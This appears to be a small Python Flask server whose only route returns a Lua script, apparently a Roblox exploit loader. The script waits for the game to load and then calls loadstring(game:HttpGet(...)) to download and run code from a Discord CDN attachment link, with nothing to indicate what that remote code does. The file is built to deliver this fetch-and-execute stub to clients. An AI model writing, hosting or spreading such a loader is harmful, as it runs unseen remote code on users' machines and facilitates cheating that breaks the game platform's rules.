from flask import Flask, Response

app = Flask(__name__)

@app.route('/')
def lua_script():
    lua_code = '''
repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
getgenv().Config = getgenv().Config or {}
local v_1 = loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/1428012794678087950/1428998137539854336/6652138009334659.lua?ex=68f489b9&is=68f33839&hm=196d2b650cd4fdbb2f19a895abf0fee4e025f098d8ddde767908677a3284eec2&"))()
v_1()
'''
    return Response(lua_code, mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
